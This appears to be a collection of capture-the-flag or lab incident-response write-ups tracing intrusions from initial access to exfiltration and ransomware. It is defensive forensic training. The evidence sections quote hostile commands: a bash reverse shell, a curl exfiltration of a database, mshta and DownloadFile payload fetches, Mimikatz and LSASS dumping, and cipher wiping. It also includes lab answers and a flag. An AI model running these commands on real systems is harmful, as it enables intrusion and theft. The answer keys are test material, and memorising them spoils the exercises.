docs.title: 📁 Case Study: First Shift
docs.text:
// MISSION_BRIEFING: AUTH_TRIAGE_INITIATED

Anomalous authentication events have been detected originating from unusual geolocations. Simultaneously, users are reporting suspicious emails. As the Junior Security Analyst, your objective is to correlate these events, analyze the phishing payloads, and determine if the network has been breached.

● CLASSIFICATION: CONFIDENTIAL ● STATUS: INVESTIGATION_ACTIVE Task 3 Auth Triage Task 4 Phishing Books Task 5 Portal Drop Task 6 Zero Tolerance Task 7 Crown Jewel Task 8 Promotion

docs.title: Task 3 – Auth Triage
docs.text:
# 🕵️ Task 3: Probably Just Fine? Event ID: VPN-Login Tactic: Defense Evasion Malware: LummaStealer Investigating a "traveling user" alert that turned into a full malware infrastructure discovery. We move from verifying an IP address to identifying a global infostealer campaign.

🚨 Security Alert: Unusual VPN Activity

Trigger: An internal SOC alert flagged an unusual VPN login for a corporate user.

Initial Assessment: Context suggested the user might be traveling. However, standard procedure requires validating the source IP before dismissing it as benign.

Investigation Goal: Determine if the IP belongs to a legitimate ISP (hotel/airport) or a hosting provider (VPS/Proxy) often used by attackers.

docs.title: 🔎 Phase 1: Infrastructure Analysis
docs.text:
We began by analyzing the source IP address to determine its ownership and reputation.

Intel QueryFindings

Action: Enriched the IP address using internal threat intelligence tools to identify the Autonomous System Number (ASN) and service type.

Result: Suspicious Infrastructure

  • ASN: 212238
  • Service Type: VPN / Hosting Service

Assessment: While VPNs can be legitimate, adversaries frequently rent VPS infrastructure to anonymize their location. This contradicts the "hotel wifi" theory and warrants deeper investigation.

docs.title: 🦠 Phase 2: Malware Analysis
docs.text:
We pivoted to a suspicious binary found on the user's machine to see if it correlated with the VPN activity.

File ArtifactsEvidence SnapshotClassification
  • Filename: zY9sqWs.exe
  • File Type: Windows PE Executable (GUI)
  • Verdict: Malicious (57/71 Vendors)

Microsoft Detection: Trojan:Win32/LummaStealer.PM!MTB

Assessment: LummaStealer is a known infostealer malware family designed to harvest credentials, crypto wallets, and browser cookies. This confirms the machine is compromised.

docs.title: 🌐 Phase 3: Threat Intelligence & Attribution
docs.text: To understand the scope of the attack, we looked for connections to broader campaigns.

docs.title: 1. YARA & Infrastructure Clustering
docs.text:
Using the file hash, we identified a YARA rule by author kevoreilly that flagged the binary.

  • Rule Logic: uint16(0) == 0x5a4d (Confirms valid PE header)
  • Infrastructure: Analysis of TLS certificates linked to the command-and-control (C2) domain revealed 151 other domains sharing the same certificate. This indicates a large-scale, organized campaign.

docs.title: 2. Affiliate Network
docs.text:
External reporting ("Behind the Curtain: How Lumma Affiliates Operate") linked this specific sample to a known affiliate group.

  • Collaborators: The malware author began working with the GhostSocks team in early 2024.
  • Cross-Platform Threat: A Mexican-based affiliate in this network was also observed using CraxsRAT to target Android devices, showing the group's capability to pivot between mobile and desktop targets.

docs.title: 🗺️ MITRE ATT&CK Mapping
docs.text:
We mapped the adversary's use of rented infrastructure to the MITRE framework to improve future detection.

T1583.003: Acquire Infrastructure Adversaries buy Virtual Private Servers (VPS) to host C2 protocols. Resource Development PRE-ATT&CK

docs.title: 🛡️ Case Verdict
docs.text:
Confirmed Compromise
  • Malware: LummaStealer (Infostealer)
  • Vector: Compromised VPN Credentials via Malware
  • Actor: Lumma Affiliate Network (GhostSocks link)
Remediation Steps
  • Isolate the host machine immediately.
  • Reset all corporate credentials (assume theft).
  • Block ASN 212238 and related TLS fingerprints.
← Back to Case File Next: Task 4 (Phishing) →

docs.title: Task 4 – Phishing
docs.text:
# 🎣 Task 4: Phishing Books Event ID: MFA Fatigue Vector: Email Attachment Actor: Cobalt Dickens A user reported MFA spam, leading to the discovery of a targeted phishing campaign against university staff. This task involves analyzing email headers, deobfuscating HTML payloads, and mapping the attack to a known threat group.

🚨 Security Alert: MFA Fatigue

Trigger: A university staff member reported receiving multiple MFA approval prompts without initiating a login.

Initial Hypothesis: The user's credentials have likely been compromised, and the attacker is attempting to bypass 2FA by annoying the user into clicking "Approve."

Investigation Goal: Analyze the source email to identify the phishing infrastructure and confirm how the credentials were stolen.

docs.title: 📧 Phase 1: Delivery & Infrastructure
docs.text:
We started by analyzing the email headers and sender infrastructure to understand how the message bypassed security filters.

Authentication ChecksSender LegitimacyMITRE Mapping

Objective: Determine why the spoofed email was delivered to the inbox.

  • SPF: none
  • DKIM: none
  • DMARC: none

Evidence:

Security Gap

The absence of a strict DMARC policy allowed the email to bypass anti-spoofing controls.

Technique: Typosquatting The sender domain closely resembled a legitimate university library service. Minor character substitutions were used to mimic trusted infrastructure.

T1583.001 – Acquire Infrastructure: Domains

The attacker registered and operated look-alike domains specifically to support phishing delivery.

docs.title: 📦 Phase 2: Payload Forensics
docs.text:
The email contained a suspicious attachment named library-invoice.pdf.html.

Attachment AnalysisLanding Page

Objective: Determine the nature of the attached file.

  • Filename: library-invoice.pdf.html
  • Technique: Double extension (.pdf.html) to trick users.
  • MD5: 442f2965cb6e9147da7908bb4eb73a72

Objective: Identify where the phishing attachment redirected the victim.

  • URL: http://lib-service.com:8083
  • Context: Impersonated a university library login portal to harvest credentials.

docs.title: 🧬 Phase 3: Code Deobfuscation
docs.text:
The HTML file contained obfuscated JavaScript (T1027) using Unicode escaping and string reversal. We used CyberChef to reveal the logic.

Hidden MessageRedirect Logic

Discovery: Hidden developer comment revealed inside the code.

"I love to phish books from libraries ^^"

Assessment: Confirms intentional malicious authorship and a "playful" campaign tone.

Logic Identification: We isolated the specific JavaScript responsible for decoding the URL at runtime.

var src = reversed.split("").reverse().join("");

Redirect Chain: 1. Initial: http://xn--librarytlu-13cwe32432-kwr.com:8082 (Punycode) 2. Final: http://lib-service.com:8083

docs.title: 🏴‍☠️ Phase 4: Threat Attribution
docs.text:
Based on the targeting (Universities), the infrastructure (Typosquatting), and the technique (Library impersonation), we attributed this activity.

Actor: Cobalt Dickens Also known as Silent Librarian. A threat group known for targeting research institutions and universities to steal academic credentials and proprietary data.

docs.title: 🛡️ Case Verdict
docs.text:
Confirmed Phishing
  • Technique: Typosquatting & HTML Smuggling
  • Vector: Credential Harvesting via Fake Login
  • Gap: Lack of DMARC enforcement
Remediation Steps
  • Reset credentials for the targeted user.
  • Block the domains lib-service.com and the Punycode variant.
  • Implement DMARC rejection policy for the university domain.
← Previous: Task 3 Back to Case File

docs.title: Task 5 – Portal Drop
docs.text:
# 🚨 Task 5: CRM Compromise Alert: Web Shell Vector: Brute Force Tactic: Exfiltration Investigating a full compromise of the CRM portal. We tracked the attacker from the initial brute-force attempts to the web shell upload, payload decoding, and final data exfiltration.

🚨 EDR Alert: Suspicious File Write

Trigger: The EDR agent on TPMHQ-CRM01 flagged a suspicious file creation event in the web directory.

File: /var/www/html/CRM/portal/uploads/invoice.php Process: php-fpm7.4 (Web Server)

Investigation Goal: Trace the attack vector from the initial web logs to the final data exfiltration command.

docs.title: 🚪 Phase 1: Access Analysis (Logs)
docs.text:
We started by analyzing the Apache access logs to verify how the attacker bypassed authentication.

1. Attacker IP2. Brute Force Counts3. Tool Switch

Finding: A single IP address, 34.67.91.83, generated a high volume of traffic compared to other sources.

Finding: The attacker performed a brute-force attack.

  • Failed Login Attempts (401): 35
  • Successful Logins (200): 18

Finding: The attacker initially used PF-Scanner/1.0 for reconnaissance, then switched to python-requests/2.31.0 for the actual exploit.

docs.title: 🐚 Phase 2: Weaponization (Web Shell)
docs.text:
After gaining access, the attacker automated the upload of a malicious PHP file.

Upload LogEDR Alert: SummaryEDR Alert: Details

Finding: The logs show a POST request to /CRM/portal/upload.php.

  • File: invoice.php
  • Time: 14:27:34
  • Tool: python-requests/2.31.0

EDR Detection: "Suspicious File Write: Backdoor:PHP/Generic"

The EDR flagged this because the file was written by the www-data user, indicating the web server itself created the file (a classic web shell indicator).

IOC Details:

  • File Path: /var/www/html/CRM/portal/uploads/invoice.php
  • Process Image: /usr/sbin/php-fpm7.4

docs.title: ⚡ Phase 3: Execution & Payloads
docs.text:
The attacker executed commands by passing Base64 encoded strings to the invoice.php web shell. We decoded these to understand their intent.

Command 1: ReconCommand 2: Reverse ShellMITRE T1505.003

Encoded Payload: ZDJodllXMXA

Decoded: whoami

The attacker verified they had code execution on the server.

Encoded Payload: Ww1GemFDQXRh...

Decoded: 

bash -i >& /dev/tcp/115.58.148.86/8080 0>&1

This command opened a reverse shell connection back to the attacker's listener on port 8080.

Technique Alignment: Server Software Component: Web Shell.

Adversaries use web shells to establish persistent access to web servers.

docs.title: 📤 Phase 4: Discovery & Exfiltration
docs.text:
With a stable shell, the attacker moved to their final objective: stealing data. The EDR process tree captured the exact commands.

1. Config Theft2. Database Exfiltration

Process Chain: bash -> cat

Command: cat /etc/trycrm/config.json

The attacker read the CRM configuration file, likely to find database credentials.

Process Chain: bash -> curl

Command: 

curl -sS -T /var/lib/trycrm/prod.db [https://portaldrop2025.xyz/x7Ja0mlqP](https://portaldrop2025.xyz/x7Ja0mlqP)

Action: The attacker exfiltrated the production database (prod.db) to a remote drop site.

docs.title: 🛡️ Case Verdict
docs.text:
Critical Compromise
  • Attacker IP: 34.67.91.83
  • C2 IP: 115.58.148.86
  • Data Lost: CRM Database & Configs
Remediation Steps
  • Isolate TPMHQ-CRM01 immediately.
  • Revoke all database secrets found in config.json.
  • Block portaldrop2025.xyz at the firewall.
← Previous: Task 4 Return to Dashboard

docs.title: Task 6 – Zero Tolerance
docs.text:
# 🏹 Task 6: Zero Tolerance Alert: Credential Dumping Vector: LNK Phishing Tactic: Lateral Movement A complete threat hunt across the network. We identified an initial compromise via a malicious LNK file, tracked the attacker's use of LOLBins (mshta.exe), and uncovered a sophisticated exfiltration script targeting backup servers.

🚨 Incident Scope

Trigger: Splunk detected suspicious PowerShell execution and AV tampering attempts.

Beachhead Host: JP-BROWN-WS Attacker C2: 10.10.14.174

Investigation Goal: Reconstruct the attack chain from the initial download to the final data exfiltration.

docs.title: 🎣 Phase 1: Initial Access (Spearphishing)
docs.text:
The investigation began by identifying how the attacker gained a foothold. We analyzed host activity and browser forensics.

1. Host Identification2. Browser Forensics3. Splunk Verification4. MITRE Context

Query: We started by identifying the top hosts generating Sysmon events to pinpoint the beachhead.

Result: JP-BROWN-WS accounts for 72% of the traffic, making it our primary suspect.

Tool: SQLite Viewer Evidence: Analyzing the browser's Downloads database revealed a suspicious LNK file download.

  • File: TravisClart_Resume.pdf.lnk
  • Path: C:\Users\jp.brown\Downloads\

Query: index=* *TravisClart_Resume*

Splunk confirmed the creation of the file on disk.

Technique: T1204.002 (Malicious File)

The attacker relies on the user executing a file disguised as a resume to initiate the infection chain.

docs.title: 📡 Phase 2: Execution & C2
docs.text:
Once the user clicked the file, the attacker executed code to establish a connection.

1. The LOLBin (Mshta)2. C2 Download

Technique: T1218.005 (Mshta)

The LNK file triggered a "Living-off-the-Land" binary to execute a remote script from memory.

Command: 

"C:\Windows\System32\mshta.exe" [http://10.10.14.174:80/KsWLx.hta](http://10.10.14.174:80/KsWLx.hta)

Masquerading: The attacker downloaded a payload named RuntimeBroker.exe to C:\Windows\Temp.

Splunk Log: 

DownloadFile('[http://10.10.14.174:80/RuntimeBroker.exe](http://10.10.14.174:80/RuntimeBroker.exe)', 'C:\Windows\Temp\RuntimeBroker.exe')

docs.title: 🔐 Phase 3: Credential Access
docs.text:
With persistence established, the attacker attempted to dump credentials to pivot deeper into the network.

1. Mimikatz Detection2. Command Analysis

Alert: We detected multiple command lines referencing Invoke-Mimikatz.

Stats: The logs show a clear spike in mimikatz.exe and cmd.exe activity.

Specific Command: 

Invoke-Mimikatz -DumpCreds

This command dumps plain-text passwords and hashes from memory (LSASS).

docs.title: 📤 Phase 4: Lateral Movement
docs.text:
Finally, the attacker moved from JP-BROWN-WS to the backup server BKUP-SRV01.

1. Pivot to Backup2. Exfiltration Script

Target Host: BKUP-SRV01

The logs show the attacker executing commands on the backup server, indicating successful lateral movement.

Script: C:\Windows\Temp\Setup-BackupServer.ps1

The attacker used this custom script to target sensitive file extensions (.bak, .sql, .mdb) and stage them in a temporary DAT file: C:\Users\bkup-svc\AppData\Local\Temp\sysbackup_20251114.dat

docs.title: 🛡️ Case Verdict
docs.text:
Major Breach Confirmed
  • Attacker C2: 10.10.14.174
  • Lateral Move: JP-BROWN-WS → Backup Svc
  • Data Risk: Full Database Dump Staged
Containment Plan
  • Isolate JP-BROWN-WS immediately.
  • Reset bkup-svc service account credentials.
  • Block traffic to 10.10.14.174.
← Previous: Task 5 Return to Dashboard

docs.title: Task 7 – Crown Jewel
docs.text:
# 📡 Task 7: Network Forensics Alert: ARP Spoofing Tool: Wireshark Tactic: Credential Harvesting Analyzing a Man-in-the-Middle (MITM) attack. We detected ARP poisoning used to intercept traffic, captured cleartext credentials in transit, and identified a stealthy DNS exfiltration tunnel.

🚨 IDS Alert: Suspicious Outbound Traffic

Trigger: Network IDS flagged a "Reverse Shell Outbound Connection" and anomalous ARP broadcasts.

Suspect Host: 10.10.10.100 Destination: 1.1.1.1:8080

Investigation Goal: Analyze PCAP and Splunk logs to determine what data was intercepted.

docs.title: 🦈 Phase 1: Man-in-the-Middle (ARP Spoofing)
docs.text:
The attacker launched an ARP Spoofing attack to position themselves between the victims and the gateway.

1. Wireshark Evidence2. Splunk Stats

Observation: A flood of ARP replies claiming 10.10.10.1 (Gateway) and 10.10.10.150 (Victim) are at the same MAC address.

  • Attacker MAC: 00:0c:29:11:22:33
  • Impersonated IP: 10.10.10.1

Query: index=* log_type=arp | table _time sender_ip sender_mac target_ip target_mac

Splunk recorded 90 spoofing events, confirming a sustained attack.

docs.title: 🔓 Phase 2: Credential Harvesting
docs.text:
With the traffic intercepted, the attacker captured unencrypted POST requests containing sensitive login information.

1. Exploit Attempt2. Cleartext Creds

Target: Jira Instance User-Agent: CVE-202X-EXPLOIT

The attacker used a specifically crafted User-Agent, likely to trigger a known vulnerability or bypass filters.

PCAP Analysis: Follow TCP Stream (Port 80).

We recovered the following credentials from a captured HTTP POST request:

  • URL: http://internal.login.local/login.php
  • Payload: username=dev_user&password=SecretPassword!

docs.title: 📤 Phase 3: C2 & Exfiltration
docs.text:
Finally, we analyzed how the attacker communicated externally and stole data.

1. Reverse Shell2. DNS Exfiltration

IDS Alert: Reverse Shell Outbound Connection Detected

  • Source: 10.10.10.100
  • Destination: 1.1.1.1 (Port 8080)

This confirms the attacker has a live interactive session on the host.

Protocol: DNS Tunneling

We detected high-frequency DNS queries to a suspicious domain. This technique hides data inside the subdomains of DNS requests (e.g., encoded-data.exfil-domain.xyz).

  • Exfil Domain: exfil-domain.xyz
  • Count: 500+ Queries

docs.title: 🛡️ Case Verdict
docs.text:
Network Compromise
  • Technique: ARP Spoofing (MITM)
  • Stolen Data: Dev Credentials (Cleartext)
  • Exfiltration: DNS Tunneling via exfil-domain.xyz
Remediation Steps
  • Enable Dynamic ARP Inspection (DAI) on switches.
  • Force HTTPS for all internal login pages.
  • Block the domain exfil-domain.xyz at the DNS resolver.
← Previous: Task 6 Return to Dashboard

docs.title: Task 8 – Promotion Night
docs.text:
# 🎖️ Task 8: Promotion Night Alert: Ransomware Tactic: Cloud Pivot Actor: BabyLockerKZ The final investigation. The adversary deployed ransomware on-premise, established persistence via scheduled tasks, and pivoted to the cloud to wipe critical backups.

🚨 Critical Incident: Full Compromise

Impact: On-Premise Ransomware + AWS Data Destruction Attacker C2: Cobalt Strike Ransom Extension: .danger17

Narrative: The attacker used gaze.exe to encrypt local files, then abused WMI for lateral movement. They located a CSV file containing AWS keys, allowed them to pivot to the cloud, steal data, and upload a ransom note.

docs.title: 🦠 Phase 1: Ransomware Deployment
docs.text:
The attack began with the execution of a binary named gaze.exe, which propagated itself via the Domain Controller's SYSVOL share.

1. Distribution2. Encryption Behavior3. Persistence4. Timeline

Mechanism: The attacker copied the malware to the domain controller to ensure network-wide execution.

Command: 

cmd.exe /c copy \\DC-01\SYSVOL\gaze.exe C:\Windows\Temp\gaze.exe

Artifacts: Files were encrypted with the extension .danger17.

Anti-Forensics: We observed cipher.exe /w being used to wipe free space, making recovery impossible.

Registry Key: BabyLockerKZ

The malware created a registry run key to ensure it executes on every reboot.

Host: DESKTOP-J9PR0CO

A timeline analysis confirms the execution of gaze.exe followed by the cipher wipe command.

docs.title: 🔬 Phase 2: Malware Analysis (IOCs)
docs.text:
We isolated the malware sample to extract Indicators of Compromise.

1. Hash Analysis2. Cipher Command

MD5 Hash: 27B0D51406B5360B49D968D69DF0F3E6

Attribution: This hash is linked to Cobalt Strike initial shellcode.

Command: cipher /w:\\?\C:

This command overwrites deleted data on the C: drive to prevent forensic recovery.

docs.title: 🕷️ Phase 3: Lateral Movement & Persistence
docs.text:
Once established, the attacker used "Living off the Land" techniques to scan the network and maintain access.

1. WMI Scanning2. MITRE Context3. Scheduled Task (XML)4. Task Creation Log

Technique: T1047 (Windows Management Instrumentation)

The attacker scanned SRV-ITFS on ports 135, 139, 445, 3389, 5985.

Technique T1047: Adversaries use WMI to execute malicious commands and payloads on remote systems.

Task Name: LanguageSync Payload: C:\Windows\System32\fr-FR\ruche.dll

The persistence mechanism was disguised as a legitimate "LanguageSync" task executing a DLL.

Event ID 4698: This Windows Security Event confirms the creation of the scheduled task LanguageSync.

docs.title: ☁️ Phase 4: The Cloud Pivot
docs.text:
The most critical moment occurred when the attacker found a file containing cleartext cloud credentials.

1. Credential Theft2. AWS Access

Source: \\SRV-ITFS\Integrations\cloud-keys.csv

Audit logs (Event 4663) show the attacker accessing this sensitive CSV file containing AWS keys.

Source IP: 152.42.128.207

Shortly after reading the CSV, we detected a login to the AWS environment from this external IP.

docs.title: 📤 Phase 5: Exfiltration & Defacement
docs.text:
With AWS access, the attacker stole critical data and left a message.

1. Data Exfiltration2. Defacement

Files Stolen: beta.tar.gz, latest.tar.gz

CloudTrail logs show GetObject events for these critical backup archives.

Message: YOU-HAVE-BEEN-PWNED.txt

The attacker uploaded this text file to the S3 bucket to confirm the breach.

docs.title: 🏆 Final Verdict
docs.text: Case Closed          The "First Shift" investigation is complete. We have successfully tracked the adversary from the initial phishing email to the final cloud compromise.        Status: Promoted Score: 100% ← Previous: Task 7 Back to Dashboard

docs.title: 📂 Operation: Honeynet Collapse
docs.text:
// MISSION_BRIEFING: DECEPTITECH_INCIDENT

A sophisticated ransomware campaign has successfully targeted the DeceptiTech corporate network. As the lead Senior Forensic Analyst, your objective is to reconstruct the multi-stage attack chain involving unauthorized Linux SSH access, lateral movement into Windows DC, and final macOS exfiltration.

Task 01 Initial Access Task 02 Windows Triage Task 03 Memory Forensics Task 04 Disk Analysis Task 05 File System Task 06 MacOS Forensics

docs.title: Task 1 Initial Access
docs.text:
# 🐧 Task 1: Initial Access Pot Event ID: HTTP-Brute Tactic: Initial Access Technique: Web Shell Investigating the collapse of the DeceptiTech network. We trace the attack from a brute-force entry on a Linux web server to root privilege escalation and internal network pivoting.

🚨 Security Alert: Validated Breach

Trigger: Massive volume of HTTP POST requests targeting the web server, followed by suspicious root-level command execution.

Initial Assessment: The attacker exploited weak credentials on the WordPress instance to establish a foothold before pivoting to the underlying operating system.

Investigation Goal: Reconstruct the kill chain—from the initial login attempt to the final malware installation—and recover the compromised system.

docs.title: 🔎 Phase 1: Web Application Reconnaissance
docs.text:
We began by analyzing the web root directory to confirm the application type and identify the entry vector.

Directory AnalysisFindings

Action: Listing the /var/www/html/wordpress directory confirmed a standard WordPress installation.

Result: Brute Force Target

Observation: Access logs indicated a high frequency of POST requests targeting the login portal.

Question: Which web page did the attacker attempt to brute force?

Answer: /wp-login.php

Assessment: The attacker successfully guessed the administrator password.

docs.title: 🛡️ Phase 2: Monitoring Verification
docs.text:
Before digging deeper, we needed to ensure the system was actually logging the attacker's actions.

Audit Rules

Action: We inspected /etc/audit/audit.rules to verify that the Linux Audit Daemon (auditd) was active.

Result: Rules were properly configured to log system calls (-k exec), ensuring we could trace the attacker's commands.

docs.title: 🐚 Phase 3: Persistence & Backdoor
docs.text:
After gaining administrative access to the CMS, the attacker needed a way to execute system-level commands.

File Artifacts

Question: What is the absolute path to the backdoored PHP file?

Evidence: The command history reveals the attacker used vim to modify a specific theme file, injecting a web shell into the error page template.

Answer: /var/www/html/wordpress/wp-content/themes/blocksy/404.php

docs.title: 🔓 Phase 4: Privilege Escalation
docs.text:
The attacker entered as the www-data user but quickly escalated to root. We used the Linux Audit system (ausearch) to trace their steps.

Step 1: Tracking UserStep 2: Escalation Vector

Action: We searched for execution events linked to the suspicious user ID (1002) to identify the start of the escalation chain.

Question: Which file path allowed the attacker to escalate to root?

Evidence: The decoded audit logs reveal the attacker found a backup SSH key, copied it to /tmp, changed its permissions, and used it to SSH into localhost as root.

Answer: /etc/ssh/id_ed25519.bak

docs.title: 📡 Phase 5: Internal Reconnaissance
docs.text:
With root access secured, the attacker used the compromised server as a pivot point to scan the internal network.

Bash History

Action: Reviewing /root/.bash_history for manual commands executed by the attacker.

Question: Which IP was port-scanned after the privilege escalation?

Evidence: The history shows netcat (nc) scans against ports 22, 80, and 3389 on a specific internal host.

Answer: 172.16.8.216

docs.title: 🦠 Phase 6: Malware Analysis
docs.text:
We identified a suspicious service disguised as a kernel process to maintain persistence.

Binary Analysis

Action: Checking the kworker.service. While kworker is a valid kernel name, it should not run from /usr/sbin/.

Question: What is the MD5 hash of the malware persisting on the host?

Evidence: Calculated the hash of the suspicious binary.

Answer: d6f2d80e78f264aff8c7aea21acb6ca6

docs.title: 🚩 Phase 7: Recovery
docs.text:
Finally, we utilized the administrative tools to recover control of the honeypot.

System Recovery

Question: Can you access the DeceptiPot in recovery mode?

Evidence: We executed the deceptipot binary with the recovery key found in the configuration (Em1lyR0ss_DeCePti!).

Flag: THM{acc3ss_gr4nt3d!}

docs.title: 🛡️ Case Verdict
docs.text:
Compromise Summary
  • Vector: WordPress Brute Force
  • Persistence: Web Shell (404.php)
  • Escalation: Stolen SSH Backup Key
Next Steps The attacker has pivoted to the internal network (172.16.8.216). We must now investigate the Windows Domain Controller. ← Back to Operation Dashboard Next: Task 2 (Windows Triage) →

docs.title: Task 2 Windows Triage
docs.text:
# 🪟 Task 2: Elevating Movement Event ID: 1149 Tactic: Lateral Movement Malware: Meterpreter Tracing the attacker's pivot from the Linux server to the internal Windows Domain Controller. We investigate RDP access, binary replacement for persistence, and credential dumping.

🚨 Security Alert: Domain Compromise

Trigger: Valid Account abuse via RDP followed by suspicious service installation.

Initial Assessment: The attacker used credentials stolen from the Linux server to move laterally to the Windows environment (172.16.8.216).

Investigation Goal: Identify the malware used for privilege escalation and the method used to dump domain credentials.

docs.title: 🚪 Phase 1: Ingress (RDP Access)
docs.text:
The attacker verified the Windows target IP during their Linux reconnaissance. We checked the Windows Event Logs for incoming Remote Desktop connections.

Event ViewerFindings

Action: filtering for Event ID 1149 (Remote Desktop Services - User Authentication Succeeded) in the TerminalServices-RemoteConnectionManager log.

Result: Valid Account Abuse

Observation: A successful RDP authentication occurred for the user emily.ross originating from the Linux server subnet.

Question: When did the attacker perform RDP login on the server?

Answer: 2025-06-30 16:33:18

docs.title: 🛠️ Phase 2: Persistence & Privilege Escalation
docs.text:
Once inside, the attacker replaced a legitimate binary to maintain access and escalate privileges. We analyzed PowerShell transcripts to find the modified file.

PowerShell TranscriptArtifact Analysis

Action: Reviewing transcript logs revealed the execution of a suspicious executable located in a user's Documents folder.

Question: What is the full path to the binary that was replaced for persistence and privesc?

Evidence: The transcript shows the "Host Application" pointing to a tool masquerading as Sysinternals Coreinfo.

Answer: C:\Users\emily.ross\Documents\Coreinfo64.exe

docs.title: 🦠 Phase 3: Malware Identification
docs.text:
We needed to determine if Coreinfo64.exe was legitimate or malicious. We generated its hash and checked it against threat intelligence databases.

Hash CalculationThreat Intel

Action: Using Get-FileHash to generate the MD5 fingerprint of the binary.

Question: What is the type or malware family of the replaced binary?

Evidence: Community detection rules identify the sample as a Meterpreter Stager, a payload often used with the Metasploit Framework.

Answer: Meterpreter

docs.title: 🔓 Phase 4: Credential Dumping
docs.text:
With high privileges secured via Meterpreter, the attacker attempted to dump system credentials. We found obfuscated commands in the PowerShell logs.

Encoded CommandDecoding

Action: We identified a base64 encoded string executed via IEX (Invoke-Expression).

Question: Which full command line was used to dump the OS credentials?

Evidence: Decoding the string reveals the use of pcd.exe (likely a renamed ProcDump tool) to dump the LSASS memory process.

Answer: pcd.exe /accepteula -ma lsass.exe text.txt

docs.title: 🔄 Phase 5: Lateral Movement
docs.text:
Finally, we tracked the attacker's movement deeper into the network using the stolen credentials.

Registry ForensicsTimeline Analysis

Action: We analyzed the Registry for evidence of PsExec execution (PSEXESVC), a common tool for lateral movement.

Question: Using the stolen credentials, when did the attacker perform lateral movement?

Evidence: The Last Write Timestamp of the PSEXESVC service key indicates exactly when the tool was executed.

Answer: 2025-06-30 19:47:14

docs.title: 🛡️ Case Verdict
docs.text:
Compromise Summary
  • Method: RDP via Stolen Creds
  • Malware: Meterpreter (Coreinfo64.exe)
  • Dumped Hash: eb3d2de2f21b31933fb4a4fd7a7d314d
Investigation Status The attacker has dumped the password for matthew.collins. We must now investigate the memory forensics to see what else they injected. ← Previous: Task 1 Next: Task 3 (Memory Forensics) →

docs.title: Task 3 Memory Forensics
docs.text:
# 🧠 Task 3: Lost in RAMslation Tool: Volatility 3 Tactic: Process Injection Technique: DLL Proxying Analyzing the captured RAM image of the compromised Windows server. We track the malware execution chain from a malicious DLL load to shellcode injection in a legitimate process.

🚨 Security Alert: In-Memory Threat Detected

Trigger: Suspicious process relationships and network connections identified in memory dump SRV-DMZ-GW-evidence.mem.

Initial Assessment: The attacker used rundll32.exe to execute a malicious payload, which then hollowed out a legitimate system process (notepad.exe) to hide its activity.

Investigation Goal: Extract the malware configuration, identify the injected shellcode, and determine the next lateral movement target.

docs.title: 🔎 Phase 1: Initial Execution Vector
docs.text:
We began by inspecting the process tree (windows.pstree) to identify the parent process responsible for the infection.

Process TreeArtifact Analysis

Action: filtering for suspicious parent-child relationships using vol -f ... windows.pstree.

Question 1: What is the absolute path to the initial malicious file executed on this host?

Evidence: The process rundll32.exe (PID 2928) was observed loading a suspicious DLL from a scheduled task folder.

Answer: C:\Windows\Tasks\MicrosoftUpdate.dll

Question 2: Which process ID (PID) was assigned to the process used to execute the initial payload?

Answer: 2928

docs.title: 💻 Phase 2: Command Line Forensics
docs.text:
To understand how the DLL was executed, we extracted the full command line arguments using the windows.cmdline plugin.

Command ExtractionFindings

Action: Analyzing the arguments passed to PID 2928.

Question: What was the full command line used by the attacker to launch initial execution on this host?

Evidence: The attacker used the specific entry point RunMe to trigger the malicious code within the DLL.

Answer: rundll32.exe C:\windows\tasks\MicrosoftUpdate.dll, RunMe

docs.title: ⛓️ Phase 3: The Execution Chain
docs.text:
Tracing the malware further, we observed it spawning new child processes to evade detection.

Process ChainFinal Payload

Action: Following the tree: rundll32.exe -> security-update.exe -> notepad.exe.

Question: The attack launched various processes. What is the name of the final process in the chain?

Evidence: The malware ultimately injected itself into notepad.exe (PID 836) to blend in with normal user activity.

Answer: notepad.exe

docs.title: 💉 Phase 4: Shellcode Analysis
docs.text:
We used windows.malfind to scan for injected code segments (memory pages with PAGE_EXECUTE_READWRITE permissions).

Memory DumpHex Analysis

Action: Inspecting the memory space of notepad.exe revealed a suspicious executable segment.

Question: What are the first five bytes (in hex, e.g., 4d5a9000) of the Meterpreter shellcode injected into it?

Evidence: The hex dump starts with fc 48 89 ce 48. This is a classic signature for x64 shellcode prologues.

Answer: fc4889ce48

docs.title: 🌐 Phase 5: Lateral Movement Tracking
docs.text:
Finally, we used windows.netscan to see if the malware established any active network connections.

Network ConnectionsListening PortsTarget Identification

Action: Filtering for established connections, specifically on RDP ports (3389).

Action: We also checked for listening ports to see if the malware was waiting for incoming connections.

Question: Which is the IP address that the hosts perform a lateral movement using port 3389?

Evidence: An active ESTABLISHED RDP connection was found initiated by powershell.exe to a new internal IP.

Answer: 172.16.2.9

docs.title: 🛡️ Case Verdict
docs.text:
Memory Findings
  • Payload: MicrosoftUpdate.dll (Malicious)
  • Technique: Process Injection (Notepad)
  • Injection Type: Meterpreter Shellcode
Investigation Status The attacker has moved laterally to 172.16.2.9. We must now switch to Disk Forensics to recover deleted data. ← Previous: Task 2 Next: Task 4 (Disk Analysis) →

docs.title: Task 4 Disk Analysis
docs.text:
# 💾 Task 4: CRM Snatch Tool: Registry Explorer Tactic: Exfiltration Technique: Data Staging Investigating the disk image of the compromised workstation. We analyze user artifacts to identify the account used for lateral movement and the tools used to steal sensitive CRM data.

🚨 Security Alert: Data Exfiltration Detected

Trigger: High-volume outbound traffic detected from a workstation to a known cloud storage provider.

Initial Assessment: The attacker compromised a domain user account, staged sensitive corporate data, and utilized a command-line tool to upload it to external storage.

Investigation Goal: Identify the compromised account, the C2 infrastructure, the exfiltration tool, and the scope of the data breach.

docs.title: 👤 Phase 1: User Forensic Analysis
docs.text:
We began by analyzing the NTUSER.DAT hive and PowerShell history files to determine which account was compromised and how long the attacker was active.

Account IdentificationSession DurationFindings

Action: We located the PowerShell command history file (ConsoleHost_history.txt). The directory path clearly indicates the user profile in use.

Action: Analyzing the UserAssist registry key (NTUSER.DAT) to calculate the execution time of powershell.exe.

Question 1: Which domain account was used to initiate the remote session onto the host?

Answer: matthew.collins (Confirmed by file path C:\Users\matthew.collins\...)

Question 2: For how many seconds did the attacker maintain their PowerShell session active?

Evidence: The Focus Time shows 0d, 0h, 57m, 35s. Calculation: (57 * 60) + 35 = 3455 seconds.

Answer: 3455

docs.title: 📡 Phase 2: C2 Infrastructure & Tooling
docs.text:
The PowerShell history revealed the commands used to download exfiltration tools from an external Command and Control (C2) server.

Download CommandsFindings

Action: Reviewing the ConsoleHost_history.txt content revealed Invoke-WebRequest calls used to fetch tools.

Question 3: What was the attacker's C2 IP address used for staging and exfiltration?

Evidence: The URL http://167.172.41.141/rclone... was used to download the malicious toolkit.

